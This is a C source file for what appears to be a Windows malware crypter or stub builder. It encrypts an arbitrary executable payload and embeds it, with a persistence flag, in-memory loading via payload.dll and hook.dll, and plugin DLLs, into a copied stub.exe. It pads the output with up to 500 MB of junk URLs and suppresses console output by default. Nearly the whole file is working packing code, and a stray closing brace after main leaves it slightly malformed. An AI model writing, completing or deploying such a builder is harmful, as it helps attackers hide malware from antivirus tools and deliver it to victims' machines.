#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <windows.h>
#include "plugin.h"
#include "crypto.h"
#include <bcrypt.h>

#define ARGON_T_COST 2
#define ARGON_M_COST_KIB 65536
#define ARGON_PARALLELISM 1

static void secure_zero(void *ptr, size_t len) {
    if (ptr && len) {
        SecureZeroMemory(ptr, len);
    }
}

#ifndef ALLOW_CONSOLE_PRINTS
#define printf(...) ((void)0)
#define fprintf(...) ((void)0)
#define puts(...) ((void)0)
#define putchar(...) ((void)0)
#define perror(...) ((void)0)
#endif

#ifndef PATH_BUF_LEN
#define PATH_BUF_LEN 4096
#endif

#define CFG_MAGIC "STCF"
#define CFG_VERSION 1

typedef struct {
    char magic[4];
    uint16_t version;
    uint16_t reserved;
} PayloadHeader;

// PayloadConfig shared type (moved to file scope so it is visible to all functions)
typedef struct {
    char key_hex[65];           // 64 chars + null terminator
    unsigned char persistence;  // 1 byte
    unsigned int junk_url_count;    // 4 bytes
    unsigned long long payload_size;      // 8 bytes
    unsigned char load_in_memory; // 1 byte
    unsigned char payload_data[1]; // Variable length
} PayloadConfig;

// Temporary entry used when building the plugin overlay
typedef struct { PluginEntry ent; unsigned char *blob; } EntryTmp;

void hex_to_bytes(const char *hex, unsigned char *bytes, size_t len) {
    for (size_t i = 0; i < len; i++) {
        char tmp[3] = {0};
        tmp[0] = hex[2*i];
        tmp[1] = hex[2*i + 1];
        unsigned int v = (unsigned int)strtoul(tmp, NULL, 16);
        bytes[i] = (unsigned char)(v & 0xFF);
    }
}

int main(int argc, char *argv[]) {
    if (argc != 7) {
        fprintf(stderr, "Usage: %s <payload_path> <output_path> <key_hex> <junk_size_mb> <persistence> <load_in_memory>\n", argv[0]);
        return 1;
    }

    const char *payload_path = argv[1];
    const char *output_path = argv[2];
    const char *key_hex = argv[3];
    int junk_size_mb = atoi(argv[4]);
    int persistence = atoi(argv[5]); // No validation, accept any value
    int load_in_memory = atoi(argv[6]);

    // Validate key_hex (should be 64 chars for a 32-byte key)
    if (strlen(key_hex) != 64) {
        fprintf(stderr, "Error: Key must be a 64-character hex string (32 bytes).\n");
        return 1;
    }

    // Convert key_hex to bytes
    unsigned char key[32];
#ifdef USE_KEY_VIRTUALLOCK
    VirtualLock(key, sizeof(key));
#endif
    hex_to_bytes(key_hex, key, 32);
    printf("Encryption key first 4 bytes: %02x %02x %02x %02x\n", key[0], key[1], key[2], key[3]);

    // Validate junk_size_mb
    if (junk_size_mb < 0 || junk_size_mb > 500) {
        fprintf(stderr, "Error: Junk size must be between 0 and 500 MB.\n");
        return 1;
    }

    // Validate load_in_memory
    if (load_in_memory != 0 && load_in_memory != 1) {
        fprintf(stderr, "Error: Load in memory must be 0 or 1.\n");
        return 1;
    }

    // Read the payload file
    int ret = 1;
    FILE *payload_file = NULL;
    FILE *dll_file = NULL;
    FILE *hook_dll_file = NULL;
    FILE *outf = NULL;
    HANDLE hUpdate = NULL;
    HANDLE hDllUpdate = NULL;
    unsigned char *payload_data = NULL;
    unsigned char *junk_data = NULL;
    unsigned char *dll_data = NULL;
    unsigned char *hook_dll_data = NULL;
    unsigned char *config_blob = NULL;
    PayloadConfig *config = NULL;
    long payload_size = 0;

    payload_file = fopen(payload_path, "rb");
    if (!payload_file) {
        fprintf(stderr, "Error: Could not open payload file: %s\n", payload_path);
        ret = 1;
        goto cleanup;
    }

    fseek(payload_file, 0, SEEK_END);
    payload_size = ftell(payload_file);
    fseek(payload_file, 0, SEEK_SET);

    payload_data = malloc(payload_size);
    if (!payload_data) {
        fprintf(stderr, "Error: Could not allocate memory for payload.\n");
        ret = 1;
        goto cleanup;
    }

    if (fread(payload_data, 1, payload_size, payload_file) != payload_size) {
        fprintf(stderr, "Error: Could not read payload file.\n");
        ret = 1;
        goto cleanup;
    }
    fclose(payload_file);
    payload_file = NULL;

    printf("Payload first 4 bytes before encryption: %02x %02x %02x %02x\n",
           payload_data[0], payload_data[1], payload_data[2], payload_data[3]);
    if (payload_data[0] == 0x4D && payload_data[1] == 0x5A) {
        printf("Payload has valid DOS signature (MZ).\n");
    }

    // Encrypt payload using Argon2id-derived key + ChaCha20-Poly1305 envelope
    uint8_t salt[CRYPTO_SALT_LEN];
    if (BCryptGenRandom(NULL, salt, CRYPTO_SALT_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0) {
        fprintf(stderr, "Error: RNG failed for salt generation.\n");
        ret = 1;
        goto cleanup;
    }
    uint8_t key32[CRYPTO_KEY_LEN];
    if (crypto_argon2id_derive((const uint8_t *)key_hex, strlen(key_hex), salt, CRYPTO_SALT_LEN, ARGON_T_COST, ARGON_M_COST_KIB, ARGON_PARALLELISM, key32, sizeof(key32)) != 0) {
        fprintf(stderr, "Error: Argon2id derive failed.\n");
        ret = 1;
        goto cleanup;
    }

    CryptoEnvelope env = {0};
    env.version = CRYPTO_VERSION;
    env.t_cost = ARGON_T_COST;
    env.m_cost_kib = ARGON_M_COST_KIB;
    env.parallelism = ARGON_PARALLELISM;
    memcpy(env.salt, salt, CRYPTO_SALT_LEN);
    env.ciphertext_len = (size_t)payload_size;

    size_t ciphertext_len = (size_t)payload_size;
    unsigned char *ciphertext = malloc(ciphertext_len);
    if (!ciphertext) {
        fprintf(stderr, "Error: Could not allocate ciphertext buffer.\n");
        ret = 1;
        goto cleanup;
    }

    if (crypto_chacha20_poly1305_encrypt(payload_data, (size_t)payload_size, key32, NULL, 0, &env, ciphertext) != 0) {
        fprintf(stderr, "Error: ChaCha20-Poly1305 encryption failed.\n");
        secure_zero(key32, sizeof(key32));
        free(ciphertext);
        ret = 1;
        goto cleanup;
    }
    secure_zero(key32, sizeof(key32));

    size_t stored_len = sizeof(CryptoEnvelope) + ciphertext_len;
    unsigned char *enc_blob = malloc(stored_len);
    if (!enc_blob) {
        fprintf(stderr, "Error: Could not allocate encrypted blob buffer.\n");
        free(ciphertext);
        ret = 1;
        goto cleanup;
    }
    CryptoEnvelope env_store = env;
    env_store.ciphertext = NULL; // do not persist pointers
    memcpy(enc_blob, &env_store, sizeof(CryptoEnvelope));
    memcpy(enc_blob + sizeof(CryptoEnvelope), ciphertext, ciphertext_len);
    free(ciphertext);
    printf("Payload encrypted (ChaCha20-Poly1305) size: %ld bytes\n", payload_size);

    // Calculate junk URL count and generate junk data
    long target_size_bytes = junk_size_mb * 1024 * 1024;
    long url_count = target_size_bytes / 30;
    size_t junk_size = url_count * 30;
    junk_data = NULL;
    if (url_count > 0) {
        junk_data = malloc(junk_size);
        if (!junk_data) {
            fprintf(stderr, "Error: Could not allocate memory for junk data.\n");
            ret = 1;
            goto cleanup;
        }
        // Generate junk URLs (e.g., "http://exampleX.com")
        for (long i = 0; i < url_count; i++) {
            snprintf((char *)(junk_data + i * 30), 30, "http://example%ld.com", i);
        }
        printf("Generated %ld junk URLs, total size: %zu bytes\n", url_count, junk_size);
    } else {
        printf("No junk URLs to generate (junk_size_mb = %d).\n", junk_size_mb);
    }

        // Calculate the total size using offsetof to ensure correct allocation
        stored_len = sizeof(CryptoEnvelope) + (size_t)payload_size;
        size_t config_size = offsetof(PayloadConfig, payload_data) + stored_len;
        size_t blob_size = sizeof(PayloadHeader) + config_size;
        printf("PayloadConfig size: fixed part=%zu, stored_len=%zu, plaintext_size=%ld, total=%zu bytes (with header=%zu)\n",
            offsetof(PayloadConfig, payload_data), stored_len, payload_size, config_size, blob_size);
        printf("Offset of payload_data: %zu\n", offsetof(PayloadConfig, payload_data));

    config_blob = malloc(blob_size);
    if (!config_blob) {
        fprintf(stderr, "Error: Could not allocate memory for payload config.\n");
        ret = 1;
        goto cleanup;
    }
    memset(config_blob, 0, blob_size);
    PayloadHeader *hdr = (PayloadHeader *)config_blob;
    memcpy(hdr->magic, CFG_MAGIC, sizeof(hdr->magic));
    hdr->version = CFG_VERSION;
    hdr->reserved = 0;
    config = (PayloadConfig *)(config_blob + sizeof(PayloadHeader));

    strncpy(config->key_hex, key_hex, 65);
    config->persistence = (unsigned char)persistence;
    config->junk_url_count = (uint32_t)url_count;
    config->payload_size = (uint64_t)payload_size;
    config->load_in_memory = (unsigned char)load_in_memory;
    memcpy(config->payload_data, enc_blob, stored_len);
    // No longer needed after copying to config; null it so cleanup doesn't double free
    free(payload_data);
    payload_data = NULL;
    free(enc_blob);
    enc_blob = NULL;

    // Copy stub.exe to the user-specified output_path
    if (!CopyFileA("stub.exe", output_path, FALSE)) {
        fprintf(stderr, "Error: Failed to copy stub.exe to %s: %d\n", output_path, GetLastError());
        ret = 1;
        goto cleanup;
    }
    printf("Copied stub.exe to %s\n", output_path);

    // Embed resources into the output executable
    hUpdate = BeginUpdateResource(output_path, FALSE);
    if (!hUpdate) {
        fprintf(stderr, "Error: BeginUpdateResource for output executable failed: %d\n", GetLastError());
        ret = 1;
        goto cleanup;
    }
    printf("BeginUpdateResource successful for %s\n", output_path);

    if (load_in_memory) {
        // Step 1: Copy template.dll to payload.dll and embed the PayloadConfig resource
        if (!CopyFileA("template.dll", "payload.dll", FALSE)) {
            fprintf(stderr, "Error: Failed to copy template.dll to payload.dll: %d\n", GetLastError());
            ret = 1;
            goto cleanup;
        }
        printf("Copied template.dll to payload.dll\n");

        hDllUpdate = BeginUpdateResource("payload.dll", FALSE);
        if (!hDllUpdate) {
            fprintf(stderr, "Error: BeginUpdateResource for payload.dll failed: %d\n", GetLastError());
            ret = 1;
            goto cleanup;
        }
        printf("BeginUpdateResource successful for payload.dll\n");

        // Add the PayloadConfig as a resource in payload.dll
        if (!UpdateResource(hDllUpdate, "PAYLOAD", "CONFIG", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), config_blob, blob_size)) {
            fprintf(stderr, "Error: UpdateResource for PayloadConfig in payload.dll failed: %d\n", GetLastError());
            ret = 1;
            goto cleanup;
        }
        printf("Embedded PayloadConfig resource into payload.dll\n");

        // Commit the resource changes to payload.dll
        if (!EndUpdateResource(hDllUpdate, FALSE)) {
            fprintf(stderr, "Error: EndUpdateResource for payload.dll failed: %d\n", GetLastError());
            ret = 1;
            goto cleanup;
        }
        printf("EndUpdateResource successful for payload.dll\n");

        // Step 2: Read payload.dll into memory and embed it into the output executable
        dll_file = fopen("payload.dll", "rb");
        if (!dll_file) {
            fprintf(stderr, "Error: Could not open payload.dll: %d\n", GetLastError());
            ret = 1;
            goto cleanup;
        }

        fseek(dll_file, 0, SEEK_END);
        long dll_size = ftell(dll_file);
        fseek(dll_file, 0, SEEK_SET);

        dll_data = malloc(dll_size);
        if (!dll_data) {
            fprintf(stderr, "Error: Could not allocate memory for payload.dll data.\n");
            ret = 1;
            goto cleanup;
        }

        if (fread(dll_data, 1, dll_size, dll_file) != dll_size) {
            fprintf(stderr, "Error: Could not read payload.dll.\n");
            ret = 1;
            goto cleanup;
        }
        fclose(dll_file);
        dll_file = NULL;
        printf("Read payload.dll into memory, size: %ld bytes\n", dll_size);

        // Remove the temporary payload.dll file
        if (!DeleteFileA("payload.dll")) {
            fprintf(stderr, "Warning: Could not delete temporary payload.dll: %d\n", GetLastError());
        } else {
            printf("Deleted temporary payload.dll\n");
        }

        // Embed the DLL into the output executable
            if (!UpdateResource(hUpdate, "PAYLOAD", "DLL", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), dll_data, dll_size)) {
            fprintf(stderr, "Error: UpdateResource for payload.dll failed: %d\n", GetLastError());
            ret = 1;
            goto cleanup;
        }
        printf("Embedded payload.dll resource into %s\n", output_path);

        free(dll_data);
        dll_data = NULL;

        // Step 3: Embed hook.dll into the output executable
        hook_dll_file = fopen("hook.dll", "rb");
        if (!hook_dll_file) {
            fprintf(stderr, "Error: Could not open hook.dll: %d\n", GetLastError());
            ret = 1;
            goto cleanup;
        }

        fseek(hook_dll_file, 0, SEEK_END);
        long hook_dll_size = ftell(hook_dll_file);
        fseek(hook_dll_file, 0, SEEK_SET);

        hook_dll_data = malloc(hook_dll_size);
        if (!hook_dll_data) {
            fprintf(stderr, "Error: Could not allocate memory for hook.dll data.\n");
            ret = 1;
            goto cleanup;
        }

        if (fread(hook_dll_data, 1, hook_dll_size, hook_dll_file) != hook_dll_size) {
            fprintf(stderr, "Error: Could not read hook.dll.\n");
            ret = 1;
            goto cleanup;
        }
        fclose(hook_dll_file);
        hook_dll_file = NULL;
        printf("Read hook.dll into memory, size: %ld bytes\n", hook_dll_size);

        // Embed hook.dll into the output executable as HOOKDLL
        if (!UpdateResource(hUpdate, "PAYLOAD", "HOOKDLL", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), hook_dll_data, hook_dll_size)) {
            fprintf(stderr, "Error: UpdateResource for hook.dll failed: %d\n", GetLastError());
            ret = 1;
            goto cleanup;
        }
        printf("Embedded hook.dll resource into %s\n", output_path);

        free(hook_dll_data);
        hook_dll_data = NULL;
    } else {
        // Embed the header + config blob for disk mode as well
        if (!UpdateResource(hUpdate, "PAYLOAD", "CONFIG", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), config_blob, blob_size)) {
            fprintf(stderr, "Error: UpdateResource for PayloadConfig in output executable failed: %d\n", GetLastError());
            ret = 1;
            goto cleanup;
        }
        printf("Embedded PayloadConfig (with header) directly into %s\n", output_path);
    }

    // Embed junk URLs if any
    if (junk_data && url_count > 0) {
        if (!UpdateResource(hUpdate, "JUNK", "URLS", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), junk_data, junk_size)) {
            fprintf(stderr, "Error: UpdateResource for junk URLs failed: %d\n", GetLastError());
            ret = 1;
            goto cleanup;
        }
        printf("Embedded %ld junk URLs into %s, total size: %zu bytes\n", url_count, output_path, junk_size);
    }

    // Commit the resource changes to the output executable
    if (!EndUpdateResource(hUpdate, FALSE)) {
        fprintf(stderr, "Error: EndUpdateResource for output executable failed: %d\n", GetLastError());
        ret = 1;
        goto cleanup;
    }
    hUpdate = NULL; // committed
    printf("EndUpdateResource successful for %s\n", output_path);

    // After embedding resources, append any plugins found in the `plugins/` folder as a simple overlay.
    {
        const char *disable_plugins = getenv("PLUGIN_DIR_DISABLE");
        if (disable_plugins && disable_plugins[0] != '\0') {
            printf("Skipping plugin overlay (PLUGIN_DIR_DISABLE set)\n");
        } else {
            WIN32_FIND_DATAA fd;
            HANDLE hFind = INVALID_HANDLE_VALUE;
            char searchPattern[PATH_BUF_LEN];
            const char *env_plugin_dir = getenv("PLUGIN_DIR");
            if (env_plugin_dir && env_plugin_dir[0] != '\0') {
                snprintf(searchPattern, PATH_BUF_LEN, "%s\\*.dll", env_plugin_dir);
            } else {
                snprintf(searchPattern, PATH_BUF_LEN, "plugins\\*.dll");
            }
            hFind = FindFirstFileA(searchPattern, &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                printf("Scanning for plugins in: %s\n", searchPattern);
            EntryTmp *entries = NULL;
            size_t entry_count = 0;
            do {
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                char path[PATH_BUF_LEN];
                if (env_plugin_dir && env_plugin_dir[0] != '\0')
                    snprintf(path, PATH_BUF_LEN, "%s\\%s", env_plugin_dir, fd.cFileName);
                else
                    snprintf(path, PATH_BUF_LEN, "plugins\\%s", fd.cFileName);
                FILE *fp = fopen(path, "rb");
                if (!fp) continue;
                fseek(fp, 0, SEEK_END);
                long sz = ftell(fp);
                fseek(fp, 0, SEEK_SET);
                unsigned char *buf = malloc(sz);
                if (!buf) { fclose(fp); continue; }
                if (fread(buf, 1, sz, fp) != (size_t)sz) { free(buf); fclose(fp); continue; }
                fclose(fp);

                entries = realloc(entries, sizeof(EntryTmp) * (entry_count + 1));
                memset(&entries[entry_count], 0, sizeof(EntryTmp));
                PluginEntry *ent = &entries[entry_count].ent;
                strncpy(ent->id, fd.cFileName, sizeof(ent->id)-1);
                ent->blob_offset = 0; // will set later
                ent->blob_len = (uint32_t)sz;
                ent->flags = 1; // plaintext flag
                ent->stage = PLUGIN_STAGE_POSTLAUNCH; // default stage when not specified by GUI
                ent->order = 0; // default order
                // If a metadata file exists (created by GUI), read stage/order
                char meta_path[PATH_BUF_LEN];
                if (env_plugin_dir && env_plugin_dir[0] != '\0')
                    snprintf(meta_path, PATH_BUF_LEN, "%s\\%s.meta", env_plugin_dir, fd.cFileName);
                else
                    snprintf(meta_path, PATH_BUF_LEN, "plugins\\%s.meta", fd.cFileName);
                FILE *mf = fopen(meta_path, "r");
                if (mf) {
                    char line[128];
                    while (fgets(line, sizeof(line), mf)) {
                        int s = -1, o = -1;
                        if (sscanf(line, "stage=%d", &s) == 1) {
                            if (s >= 0 && s <= 4) ent->stage = (uint8_t)s;
                        }
                        if (sscanf(line, "order=%d", &o) == 1) {
                            if (o >= 0 && o <= 65535) ent->order = (uint16_t)o;
                        }
                    }
                    fclose(mf);
                }
                memset(ent->iv, 0, sizeof(ent->iv));
                memset(ent->tag, 0, sizeof(ent->tag));
                entries[entry_count].blob = buf;
                entry_count++;
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);

            if (entry_count > 0) {
                uint32_t table_size = (uint32_t)(entry_count * sizeof(PluginEntry));
                uint32_t blobs_size = 0;
                for (size_t i = 0; i < entry_count; i++) blobs_size += entries[i].ent.blob_len;
                size_t overlay_size = table_size + blobs_size + sizeof(PluginOverlayHeader);
                unsigned char *obuf = malloc(overlay_size);
                if (obuf) {
                    unsigned char *ptr = obuf;
                    uint32_t cur_blob_off = table_size;
                    for (size_t i = 0; i < entry_count; i++) {
                        entries[i].ent.blob_offset = cur_blob_off;
                        memcpy(ptr, &entries[i].ent, sizeof(PluginEntry)); ptr += sizeof(PluginEntry);
                        cur_blob_off += entries[i].ent.blob_len;
                    }
                    for (size_t i = 0; i < entry_count; i++) {
                        memcpy(ptr, entries[i].blob, entries[i].ent.blob_len);
                        ptr += entries[i].ent.blob_len;
                    }
                    PluginOverlayHeader oh = {0};
                    memcpy(oh.magic, PLUGIN_MAGIC, 8);
                    // table_offset stores the distance from the header back to the overlay start
                    // i.e., header_pos - overlay_start = table_size + blobs_size
                    oh.table_offset = (uint32_t)(table_size + blobs_size);
                    oh.plugin_count = (uint32_t)entry_count;
                    memcpy(ptr, &oh, sizeof(oh)); ptr += sizeof(oh);

                    FILE *outf = fopen(output_path, "ab");
                    if (outf) {
                            // Log which plugin filenames we are appending for diagnostics
                            printf("Appending plugins to %s:\n", output_path);
                            for (size_t pi = 0; pi < entry_count; pi++) {
                                printf(" - %s (stage=%u order=%u)\n", entries[pi].ent.id, entries[pi].ent.stage, entries[pi].ent.order);
                            }
                            fwrite(obuf, 1, overlay_size, outf);
                            fclose(outf);
                            printf("Appended %zu plugin(s) overlay to %s\n", entry_count, output_path);
                    }
                    free(obuf);
                }
            }

            if (entries) {
                for (size_t i = 0; i < entry_count; i++) if (entries[i].blob) free(entries[i].blob);
                free(entries);
            }
        }
    }

    printf("Stub generated successfully: %s\n", output_path);
    ret = 0;

cleanup:
    // If we failed and have an outstanding update handle, abort changes
    if (hDllUpdate) {
        EndUpdateResource(hDllUpdate, TRUE);
        hDllUpdate = NULL;
    }
    if (hUpdate) {
        EndUpdateResource(hUpdate, TRUE);
        hUpdate = NULL;
    }
    if (payload_file) fclose(payload_file);
    if (dll_file) fclose(dll_file);
    if (hook_dll_file) fclose(hook_dll_file);
    if (outf) fclose(outf);
    if (dll_data) free(dll_data);
    if (hook_dll_data) free(hook_dll_data);
    if (config_blob) free(config_blob);
    if (junk_data) free(junk_data);
    if (payload_data) free(payload_data);
    secure_zero(key, sizeof(key));
    return ret;
}

}

/* Removed GCC diagnostic pragmas to avoid push/pop mismatch on some toolchains */
